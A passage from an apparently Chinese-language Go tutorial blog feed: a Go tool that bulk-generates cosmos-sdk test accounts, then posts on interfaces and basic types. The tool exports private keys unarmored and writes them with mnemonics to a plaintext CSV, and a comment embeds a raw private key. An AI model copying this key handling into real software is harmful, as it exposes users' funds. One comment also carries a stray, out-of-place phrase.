class="hljs-type">uint64</span>)</span></span> (User, <span class="hljs-type">error</span>) &#123;<br>addRes, err := add(id)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> User&#123;&#125;, err<br>&#125;<br>pk, _, err := export(id)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> User&#123;&#125;, err<br>&#125;<br>userInfo := User&#123;Id: addRes.Name, Address: addRes.Address, PrivateKey: pk, Mnemonic: addRes.Mnemonic&#125;<br><span class="hljs-keyword">return</span> userInfo, <span class="hljs-literal">nil</span><br>&#125;<br><br><span class="hljs-comment">// 添加一个用户 传入用户id</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">add</span><span class="hljs-params">(id <span class="hljs-type">uint64</span>)</span></span> (addResponse, <span class="hljs-type">error</span>) &#123;<br>formattedNumber := fmt.Sprintf(<span class="hljs-string">&quot;u-%06d&quot;</span>, id)<br><br>args := []<span class="hljs-type">string</span>&#123;<span class="hljs-string">&quot;keys&quot;</span>, <span class="hljs-string">&quot;add&quot;</span>, formattedNumber, <span class="hljs-string">&quot;--keyring-backend=test&quot;</span>, dirPath&#125;<br><br>cmd := exec.Command(binaryPath, args...) <span class="hljs-comment">// 执行二进制文件，传入参数</span><br>cmd.Stdin = strings.NewReader(<span class="hljs-string">&quot;y\n&quot;</span>)     <span class="hljs-comment">// y回车</span><br><br>stdout, stderr := &amp;strings.Builder&#123;&#125;, &amp;strings.Builder&#123;&#125;<br>cmd.Stdout, cmd.Stderr = stdout, stderr<br><br>err := cmd.Run()<br><br>outputMutex.Lock()<br><span class="hljs-keyword">defer</span> outputMutex.Unlock()<br><br><span class="hljs-keyword">var</span> data []addResponse<br><span class="hljs-keyword">if</span> err := yaml.Unmarshal([]<span class="hljs-type">byte</span>(stdout.String()), &amp;data); err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;Error parsing YAML: %v&quot;</span>, err)<br>&#125;<br><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(data) &lt;= <span class="hljs-number">0</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;Data is nil: %v&quot;</span>, err)<br><span class="hljs-keyword">return</span> addResponse&#123;&#125;, err<br>&#125;<br><br><span class="hljs-comment">// handle Mnemonic</span><br>text := strings.Join([]<span class="hljs-type">string</span>&#123;stderr.String()&#125;, <span class="hljs-string">&quot;\n&quot;</span>)<br>splitText := strings.SplitAfter(text, <span class="hljs-string">&quot;It is the only way to recover your account if you ever forget your password.&quot;</span>)<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(splitText) &lt; <span class="hljs-number">2</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;Could not find &#x27;It is the only way to recover your account if you ever forget your password.&#x27;&quot;</span>)<br><span class="hljs-keyword">return</span> addResponse&#123;&#125;, err<br>&#125;<br><span class="hljs-comment">// Extract the mnemonic phrase</span><br>mnemonic := strings.TrimSpace(splitText[<span class="hljs-number">1</span>])<br>data[<span class="hljs-number">0</span>].Mnemonic = mnemonic<br><span class="hljs-keyword">return</span> data[<span class="hljs-number">0</span>], <span class="hljs-literal">nil</span><br>&#125;<br><br><span class="hljs-comment">// Export private key</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">export</span><span class="hljs-params">(id <span class="hljs-type">uint64</span>)</span></span> (<span class="hljs-type">string</span>, <span class="hljs-type">string</span>, <span class="hljs-type">error</span>) &#123;<br>formattedNumber := fmt.Sprintf(<span class="hljs-string">&quot;u-%06d&quot;</span>, id)<br><br>args := []<span class="hljs-type">string</span>&#123;<span class="hljs-string">&quot;keys&quot;</span>, <span class="hljs-string">&quot;export&quot;</span>, formattedNumber, <span class="hljs-string">&quot;--unsafe&quot;</span>, <span class="hljs-string">&quot;--unarmored-hex&quot;</span>, <span class="hljs-string">&quot;--keyring-backend=test&quot;</span>, dirPath&#125;<br><br>cmd := exec.Command(binaryPath, args...)<br>cmd.Stdin = strings.NewReader(<span class="hljs-string">&quot;y\n&quot;</span>)<br><br>stdout, stderr := &amp;strings.Builder&#123;&#125;, &amp;strings.Builder&#123;&#125;<br>cmd.Stdout, cmd.Stderr = stdout, stderr<br><br>err := cmd.Run()<br><br><span class="hljs-keyword">return</span> strings.TrimRight(stdout.String(), <span class="hljs-string">&quot;\n&quot;</span>), stderr.String(), err<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Batch</span><span class="hljs-params">()</span></span> &#123;<br>start := time.Now()<br>goroutineNum := <span class="hljs-number">30</span><br>totalUsers := <span class="hljs-number">50000</span><br><br>wg := sync.WaitGroup&#123;&#125;<br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; goroutineNum; i++ &#123;<br>wg.Add(<span class="hljs-number">1</span>)<br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(startID <span class="hljs-type">int</span>)</span></span> &#123;<br><span class="hljs-keyword">defer</span> wg.Done()<br><br><span class="hljs-keyword">for</span> j := startID; j &lt;= totalUsers; j += goroutineNum &#123;<br>user, err := NewUser(<span class="hljs-type">uint64</span>(j))<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span><br>&#125;<br>userChan &lt;- user<br>&#125;<br>&#125;(i + <span class="hljs-number">1</span>)<br>&#125;<br><span class="hljs-comment">// Close the channel after all goroutines finish</span><br>wg.Wait()<br>elapsed := time.Since(start)<br>fmt.Printf(<span class="hljs-string">&quot;创造数据执行耗时：%v \n&quot;</span>, elapsed.Seconds())<br><span class="hljs-built_in">close</span>(userChan)<br><br>start1 := time.Now()<br><span class="hljs-comment">// Collect the generated users</span><br><span class="hljs-keyword">var</span> users []User<br><span class="hljs-keyword">for</span> user := <span class="hljs-keyword">range</span> userChan &#123;<br>users = <span class="hljs-built_in">append</span>(users, user)<br>&#125;<br><br><span class="hljs-comment">// Write users to CSV file</span><br>err := writeUsersToCSV(users, csvName)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;Error writing to CSV file:&quot;</span>, err)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>fmt.Printf(<span class="hljs-string">&quot;Users written to [%s] file successfully. \n&quot;</span>, csvName)<br>&#125;<br>elapsed2 := time.Since(start1)<br>fmt.Printf(<span class="hljs-string">&quot;写入数据执行耗时：%v \n&quot;</span>, elapsed2.Seconds())<br><br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">writeUsersToCSV</span><span class="hljs-params">(users []User, filename <span class="hljs-type">string</span>)</span></span> <span class="hljs-type">error</span> &#123;<br><span class="hljs-comment">// Create the CSV file</span><br>file, err := os.Create(filename)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br><span class="hljs-keyword">defer</span> file.Close()<br><br><span class="hljs-comment">// Create the CSV writer</span><br>writer := csv.NewWriter(file)<br><span class="hljs-keyword">defer</span> writer.Flush()<br><br><span class="hljs-comment">// Write the header row</span><br>header := []<span class="hljs-type">string</span>&#123;<span class="hljs-string">&quot;ID&quot;</span>, <span class="hljs-string">&quot;Address&quot;</span>, <span class="hljs-string">&quot;PrivateKey&quot;</span>, <span class="hljs-string">&quot;Mnemonic&quot;</span>&#125;<br>err = writer.Write(header)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br><br><span class="hljs-comment">// Write the user data rows</span><br><span class="hljs-keyword">for</span> _, user := <span class="hljs-keyword">range</span> users &#123;<br>row := []<span class="hljs-type">string</span>&#123;user.Id, user.Address, user.PrivateKey, user.Mnemonic&#125;<br>err := writer.Write(row)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">PrivFromAddrString</span><br><span class="hljs-comment">@Description: 私钥转地址, gea/cosmos-sdk/types/address.go 要更改默认地址前缀</span><br><span class="hljs-comment">@param privStr</span><br><span class="hljs-comment">@return string</span><br><span class="hljs-comment">@return error</span><br><span class="hljs-comment">*/</span><br><span class="hljs-comment">//func PrivFromAddrString(privStr string) (string, error) &#123;</span><br><span class="hljs-comment">//priBytes, err := hex.DecodeString(privStr)</span><br><span class="hljs-comment">//if err != nil &#123;</span><br><span class="hljs-comment">//return &quot;&quot;, err</span><br><span class="hljs-comment">//&#125;</span><br><span class="hljs-comment">//priv := &amp;secp256k1.PrivKey&#123;Key: priBytes&#125;</span><br><span class="hljs-comment">//accAddr := sdk.AccAddress(priv.PubKey().Address().Bytes())</span><br><span class="hljs-comment">//return accAddr.String(), nil</span><br><span class="hljs-comment">//&#125;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-comment">//s, err := add(001)</span><br><span class="hljs-comment">//s, s2, err := export(001)</span><br><span class="hljs-comment">//if err != nil &#123;</span><br><span class="hljs-comment">//return</span><br><span class="hljs-comment">//&#125;</span><br><span class="hljs-comment">//fmt.Println(s)</span><br><span class="hljs-comment">//fmt.Println(s2)</span><br><br><span class="hljs-comment">//addrString, err := PrivFromAddrString(&quot;108c7ca3d2bdf462c4af5504fcbda1c1ffec3213ef9b02f39edbafc20bc068a2&quot;)</span><br><span class="hljs-comment">//if err != nil &#123;</span><br><span class="hljs-comment">//return</span><br><span class="hljs-comment">//&#125;</span><br><span class="hljs-comment">////gea1adezarkjat6gz79sh2svr66k2ltf0ks052256v</span><br><span class="hljs-comment">//fmt.Println(addrString)</span><br><span class="hljs-comment">//if addrString != &quot;gea1adezarkjat6gz79sh2svr66k2ltf0ks052256v&quot; &#123;</span><br><span class="hljs-comment">//fmt.Println(&quot;Fail&quot;)</span><br><span class="hljs-comment">//&#125;</span><br><br><span class="hljs-comment">//user, err := NewUser(2)</span><br><span class="hljs-comment">//if err != nil &#123;</span><br><span class="hljs-comment">//return</span><br><span class="hljs-comment">//&#125;</span><br><span class="hljs-comment">//fmt.Println(user)</span><br><br>start := time.Now()<br><br>Batch()<br><br>elapsed := time.Since(start)<br>fmt.Printf(<span class="hljs-string">&quot;程序执行耗时：%v \n&quot;</span>, elapsed.Seconds())<br>&#125;<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Golang</category>
      
    </categories>
    
    
    <tags>
      
      <tag>go</tag>
      
      <tag>编程</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【Golang】go语言之接口(interface)</title>
    <link href="/2023/12/06/804go%E8%AF%AD%E8%A8%80%E4%B9%8B%E6%8E%A5%E5%8F%A3(interface)/"/>
    <url>/2023/12/06/804go%E8%AF%AD%E8%A8%80%E4%B9%8B%E6%8E%A5%E5%8F%A3(interface)/</url>
    
    <content type="html"><![CDATA[<h1 id="接口interface"><a href="#接口interface" class="headerlink" title="接口interface"></a>接口interface</h1><h2 id="关于接口的概念"><a href="#关于接口的概念" class="headerlink" title="关于接口的概念"></a>关于接口的概念</h2><ul><li><p>接口interface是定义了一组方法的集合，</p></li><li><p>接口提供了一种标准化的方式，用来规定对象的行为，。</p></li><li><p>通过接口，你定义了对象必须具备的方法。而不必关心对象的具体实现。这种抽象的方式，可以更加灵活和复用</p></li><li><p>通过定义接口interface，然后让对象来调用或者实现</p></li><li><p>接口interface可以作为函数的入参参数，也可以作为返回值 实现多态</p></li><li><p>接口Interface 是一种规范，是一种限制，</p></li></ul><p> <strong>当你把接口interface定义好后，作为入参，那你这个函数的入参，就必须有你定义的接口interface有的方法，不然就会报错，</strong></p><ul><li><p>同理你把interface类型的东西作为return出去的东西，那你就在定义return的对象时就必须定义他有哪些方法，</p></li><li><p>总的说，接口等同于python的基类，基类用于子类必须实现方法，接口也是子类必须实现方法。</p></li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-keyword">type</span> animal <span class="hljs-keyword">interface</span> &#123; <span class="hljs-comment">//在定义接口interface类型，这个类型有一个say方法</span><br>say()<br>&#125;<br><span class="hljs-keyword">type</span> cat <span class="hljs-keyword">struct</span> &#123; <span class="hljs-comment">// 结构体</span><br>Name <span class="hljs-type">string</span><br>&#125;<br><span class="hljs-keyword">type</span> dog <span class="hljs-keyword">struct</span> &#123; <span class="hljs-comment">// 结构体</span><br>Name <span class="hljs-type">string</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(c cat)</span></span> say() &#123; <span class="hljs-comment">// 这个是方法，结构体的方法</span><br>fmt.Printf(<span class="hljs-string">&quot;%v小花猫，喵喵叫\n&quot;</span>, c.Name)<br>&#125;<br><br><span class="hljs-comment">// 这两个结构体都有say方法</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(d dog)</span></span> say() &#123; <span class="hljs-comment">// 这个say也是方法，结构体的方法</span><br>fmt.Printf(<span class="hljs-string">&quot;%v小土狗，汪汪叫\n&quot;</span>, d.Name)<br><br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">aaa</span><span class="hljs-params">(a animal)</span></span> <span class="hljs-type">string</span> &#123; <span class="hljs-comment">//这个方法的入参是一个animal接口类，所以传进来的参数必须要是animal类型，必须要有say方法</span><br>a.say()<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;aaa&quot;</span><br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">bbb</span><span class="hljs-params">(s <span class="hljs-type">string</span>)</span></span> animal &#123; <span class="hljs-comment">// 这是在定义一个返回值为interface接口类型的函数</span><br><span class="hljs-comment">//a.say()</span><br><span class="hljs-comment">//a.say()</span><br>c := cat&#123;<span class="hljs-string">&quot;小白&quot;</span>&#125;<br><span class="hljs-keyword">return</span> c<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>c := cat&#123;<span class="hljs-string">&quot;小白&quot;</span>&#125;    <span class="hljs-comment">//这个C是cat结构体的实例化对象</span><br>d := aaa(c)       <span class="hljs-comment">//这个d是函数aaa的实例化对象 需要传入参，入参就是C 且这个入参必须要有say方法，不然就会报错</span><br>fmt.Printf(d)     <span class="hljs-comment">//打印这个d，此时d是有返回值string的所以可以打印出来</span><br>e := bbb(<span class="hljs-string">&quot;hello&quot;</span>) <span class="hljs-comment">//这是在实例化bbb函数，e就是上面的c，是一个interface接口类型的。</span><br>e.say()           <span class="hljs-comment">// e是不可以直接打印的，因为你无法打印接口类型。但是你可以调用这个interface接口的方法</span><br><br>&#125;<br><br></code></pre></td></tr></table></figure><h1 id="接口也是一种类型，可以定义变量"><a href="#接口也是一种类型，可以定义变量" class="headerlink" title="接口也是一种类型，可以定义变量"></a>接口也是一种类型，可以定义变量</h1><ul><li>结构体—结构体方法—接口</li><li>接口类型的变量，能够储存所有实现了该接口的结构体。</li><li>实例化一个变量（对象）</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-keyword">type</span> animal <span class="hljs-keyword">interface</span> &#123;<br>say()<br>&#125;<br><br><span class="hljs-keyword">type</span> cat <span class="hljs-keyword">struct</span> &#123;<br>Name <span class="hljs-type">string</span><br>&#125;<br><span class="hljs-keyword">type</span> dog <span class="hljs-keyword">struct</span> &#123;<br>Name <span class="hljs-type">string</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(c cat)</span></span> say() &#123;<br>fmt.Printf(<span class="hljs-string">&quot;%v小猫喵喵叫\n&quot;</span>, c.Name)<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(d dog)</span></span> say() &#123;<br>fmt.Printf(<span class="hljs-string">&quot;%v小狗汪汪叫\n&quot;</span>, d.Name)<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> a animal<br>fmt.Printf(<span class="hljs-string">&quot;类型是:%T\n&quot;</span>, a)    <span class="hljs-comment">//打印的类型是nil 类型</span><br>fmt.Printf(<span class="hljs-string">&quot;打印的内容是:%v\n&quot;</span>, a) <span class="hljs-comment">// 这个a 是一个接口类型的实例化对象，所以打印是没有数据的 打印的是nil</span><br>c := cat&#123;<span class="hljs-string">&quot;小花&quot;</span>&#125;<br>a = c          <span class="hljs-comment">//这个时候把c赋值给了a，所以a有c的属性</span><br>fmt.Println(a) <span class="hljs-comment">//所以打印的时候，就可以打印a了，</span><br>a.say()<br><br>&#125;<br><br></code></pre></td></tr></table></figure><h1 id="定义指针类型和值类型接收器实现接口"><a href="#定义指针类型和值类型接收器实现接口" class="headerlink" title="定义指针类型和值类型接收器实现接口"></a>定义指针类型和值类型接收器实现接口</h1><ul><li>值类型接口实现后，不管是结构体还是结构体指针的变量，都可以赋值给接口变量</li><li>只要是值接收器，修改的都是新的。</li><li>使用指针接收器实现接口之后，只能将结构体指针变量赋值给该接口变量</li><li>只要是指针接收器，修改的都是原来的。、</li></ul><p><strong>你在定义结构体方法的时候，将入参定义为指针类型入参即可，</strong></p><p><strong>这样你在实例化这个结构体的时候，传入指针类型即可</strong> </p>]]></content>
    
    
    <categories>
      
      <category>Golang</category>
      
    </categories>
    
    
    <tags>
      
      <tag>go</tag>
      
      <tag>编程</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【Golang】go语言之基础介绍</title>
    <link href="/2023/12/06/801go%E8%AF%AD%E8%A8%80%E4%B9%8B%E5%9F%BA%E7%A1%80%E4%BB%8B%E7%BB%8D/"/>
    <url>/2023/12/06/801go%E8%AF%AD%E8%A8%80%E4%B9%8B%E5%9F%BA%E7%A1%80%E4%BB%8B%E7%BB%8D/</url>
    
    <content type="html"><![CDATA[<h1 id="变量的定义和赋值"><a href="#变量的定义和赋值" class="headerlink" title="变量的定义和赋值"></a>变量的定义和赋值</h1><h2 id="定义-声明-一个变量"><a href="#定义-声明-一个变量" class="headerlink" title="定义(声明)一个变量"></a>定义(声明)一个变量</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> a, b <span class="hljs-type">int</span><span class="hljs-comment">// 声明同类型</span><br><span class="hljs-keyword">var</span> a, b <span class="hljs-type">int</span> = <span class="hljs-number">10</span>, <span class="hljs-number">20</span><span class="hljs-comment">// 仅同类型 blockchain making transactions safer and faster</span><br><br><span class="hljs-comment">// 声明不同类型</span><br><span class="hljs-keyword">var</span> (<br>a    <span class="hljs-type">int</span><br>b    <span class="hljs-type">string</span><br>c, d <span class="hljs-type">int</span><br>)<br></code></pre></td></tr></table></figure><h2 id="变量初始化"><a href="#变量初始化" class="headerlink" title="变量初始化"></a>变量初始化</h2><p>三种方式：完整式、类型推导、简短式</p><h2 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-comment">// const 常量名 类型 = 值</span><br><span class="hljs-keyword">const</span> a <span class="hljs-type">int</span> = <span class="hljs-number">100</span><br><span class="hljs-keyword">const</span> b = <span class="hljs-number">200</span> <span class="hljs-comment">// 类型推导</span><br>fmt.Println(b)<br>    <span class="hljs-comment">// 方式2</span><br><span class="hljs-keyword">const</span> (<br>n1 = <span class="hljs-number">100</span><br>n2 = <span class="hljs-number">200</span><span class="hljs-comment">// n2</span><br>n3 = <span class="hljs-number">300</span><br>)<br><br>&#125;<br></code></pre></td></tr></table></figure><h1 id="命名规范"><a href="#命名规范" class="headerlink" title="命名规范"></a>命名规范</h1><h2 id="定义规范"><a href="#定义规范" class="headerlink" title="定义规范"></a>定义规范</h2><ul><li>Go语言中的变量名、常量名、函数名、类型名、语句标号和包名等所有的命名，都遵循一个简单的命名规则：</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-number">1</span> 由字符，下划线，数字组成，但是不能以数字开头<br><span class="hljs-number">2</span> 大写字母和小写字母是不同的：Name和name是两个不同的变量<br><span class="hljs-number">3</span> 关键字不能用做命名；保留字都不建议用作变量名<br></code></pre></td></tr></table></figure><h2 id="命名风格"><a href="#命名风格" class="headerlink" title="命名风格"></a>命名风格</h2><ul><li>Go语言程序员推荐使用 <strong>驼峰式</strong> 命名，当名字由几个单词组成时优先使用大小写分隔，而不是优先用下划线分隔。</li><li>go文件的名字，建议用下划线的方式命名。</li><li>名字的长度没有逻辑限制，但是Go语言的风格是尽量使用短小有意义的名字</li></ul><h2 id="关键字"><a href="#关键字" class="headerlink" title="关键字"></a>关键字</h2><ul><li>Go语言中关键字有25个；关键字不能用于自定义名字，只能在特定语法结构中使用。</li></ul><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-keyword">break</span>      <span class="hljs-keyword">default</span>       func     <span class="hljs-keyword">interface</span>   <span class="hljs-symbol">select</span><br><span class="hljs-symbol">case</span>       <span class="hljs-symbol">defer</span>         <span class="hljs-symbol">go</span>       <span class="hljs-symbol">map</span>         <span class="hljs-symbol">struct</span><br><span class="hljs-symbol">chan</span>       <span class="hljs-symbol">else</span>          <span class="hljs-symbol">goto</span>     <span class="hljs-symbol">package</span>     <span class="hljs-symbol">switch</span><br><span class="hljs-symbol">const</span>      <span class="hljs-symbol">fallthrough</span>   <span class="hljs-symbol">if</span>       <span class="hljs-symbol">range</span>       <span class="hljs-symbol">type</span><br><span class="hljs-symbol">continue</span>   <span class="hljs-symbol">for</span>           <span class="hljs-symbol">import</span>   <span class="hljs-symbol">return</span>      <span class="hljs-symbol">var</span><br></code></pre></td></tr></table></figure><h2 id="保留字"><a href="#保留字" class="headerlink" title="保留字"></a>保留字</h2><ul><li>go语言中有37个保留字，主要对应内建的常量、类型和函数</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go">内建常量: <span class="hljs-literal">true</span> <span class="hljs-literal">false</span> <span class="hljs-literal">iota</span> <span class="hljs-literal">nil</span><br><br>内建类型:  <span class="hljs-type">int</span> <span class="hljs-type">int8</span> <span class="hljs-type">int16</span> <span class="hljs-type">int32</span> <span class="hljs-type">int64</span><br>          <span class="hljs-type">uint</span> <span class="hljs-type">uint8</span> <span class="hljs-type">uint16</span> <span class="hljs-type">uint32</span> <span class="hljs-type">uint64</span> <span class="hljs-type">uintptr</span><br>          <span class="hljs-type">float32</span> <span class="hljs-type">float64</span> <span class="hljs-type">complex128</span> <span class="hljs-type">complex64</span><br>          <span class="hljs-type">bool</span> <span class="hljs-type">byte</span> <span class="hljs-type">rune</span> <span class="hljs-type">string</span> <span class="hljs-type">error</span><br><br>内建函数: <span class="hljs-built_in">make</span> <span class="hljs-built_in">len</span> <span class="hljs-built_in">cap</span> <span class="hljs-built_in">new</span> <span class="hljs-built_in">append</span> <span class="hljs-built_in">copy</span> <span class="hljs-built_in">close</span> <span class="hljs-built_in">delete</span><br>          <span class="hljs-built_in">complex</span> <span class="hljs-built_in">real</span> <span class="hljs-built_in">imag</span><br>          <span class="hljs-built_in">panic</span> <span class="hljs-built_in">recover</span><br></code></pre></td></tr></table></figure><h1 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h1><h2 id="基础数据类型"><a href="#基础数据类型" class="headerlink" title="基础数据类型"></a>基础数据类型</h2><p>基本数据类型有三类：数字、字符串、布尔</p><ul><li><strong>数字类型</strong><ul><li>整型、浮点数、复数</li><li><strong>不同类型的数字不能做运算</strong></li></ul></li><li><strong>整型</strong>分为两个大类： <ul><li>按长度分为：<code>int int8、int16、int32、int64</code> </li><li>无符号整型：<code>uint uint8、uint16、uint32、uint64</code></li><li>操作系统不一样，int和uint表示的范围不一样</li></ul></li></ul><table><thead><tr><th align="center">类型</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">uint8</td><td align="center">无符号 8位整型 (0 到 255)</td></tr><tr><td align="center">uint16</td><td align="center">无符号 16位整型 (0 到 65535)</td></tr><tr><td align="center">uint32</td><td align="center">无符号 32位整型 (0 到 4294967295)</td></tr><tr><td align="center">uint64</td><td align="center">无符号 64位整型 (0 到 18446744073709551615)</td></tr><tr><td align="center">int8</td><td align="center">有符号 8位整型 (-128 到 127)</td></tr><tr><td align="center">int16</td><td align="center">有符号 16位整型 (-32768 到 32767)</td></tr><tr><td align="center">int32</td><td align="center">有符号 32位整型 (-2147483648 到 2147483647)</td></tr><tr><td align="center">int64</td><td align="center">有符号 64位整型 (-9223372036854775808 到 9223372036854775807)</td></tr></tbody></table><p><strong>浮点数</strong>分为两个大类： </p><ul><li>float32： <code>float32</code> 的浮点数的最大范围约为 <code>3.4e38</code>，可以使用常量定义：<code>math.MaxFloat32</code>。</li><li>float64： <code>float64</code> 的浮点数的最大范围约为 <code>1.8e308</code>，可以使用一个常量定义：<code>math.MaxFloat64</code></li><li>默认定义的浮点数是<code>float64</code></li><li>打印浮点数时，可以使用<code>fmt</code>包配合动词<code>%f</code>，</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br>   <span class="hljs-string">&quot;fmt&quot;</span><br>   <span class="hljs-string">&quot;math&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>   s1 := <span class="hljs-number">1.34</span><br>   fmt.Printf(<span class="hljs-string">&quot;%T\n&quot;</span>, s1) <span class="hljs-comment">// float64</span><br>   fmt.Println(math.MaxFloat32)<br>   fmt.Printf(<span class="hljs-string">&quot;%.2f\n&quot;</span>, math.Pi)<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><strong>复数</strong>分为两个大类： <ul><li>complex64和complex128</li><li>复数有实部和虚部</li></ul></li></ul><figure class="highlight 